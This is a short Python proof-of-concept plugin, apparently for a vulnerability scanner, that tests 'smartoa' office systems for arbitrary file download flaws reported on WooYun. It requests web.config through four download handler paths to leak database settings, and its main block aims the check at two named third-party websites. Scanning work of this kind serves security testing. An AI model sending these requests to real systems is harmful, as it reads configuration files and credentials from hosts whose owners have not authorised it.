#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:smartoa系统存在多个任意文件下载漏洞（泄漏数据库相关信息）
#Refer:http://www.wooyun.org/bugs/wooyun-2010-060613

def assign(service,arg):
    if service=="smartoa":
        return True,arg 
    


def  audit(arg):
    ps=[
        "file/EmailDownload.ashx?url=~/web.config&name=web.config",
        "file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
        "file/DownLoad.ashx?path=~/web.config",
        "file/MyDownLoad.ashx?path=~/web.config"
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==200 and "<configuration>" in res and '<appSettings>' in res:
            security_hole(url)
        
if __name__=="__main__":
    from dummy import *
    
    audit(assign('smartoa','http://www.xiyon.cn/')[1])
    audit(assign('smartoa','http://www.zenhai.com:1208/')[1])
    #audit(assign('smartoa','http://oa.gdfinetek.com/')[1])